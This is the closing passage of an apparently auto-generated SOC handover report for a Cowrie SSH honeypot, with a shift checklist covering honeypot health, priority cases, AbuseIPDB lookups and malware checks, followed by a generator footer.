- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T10:57:25Z_
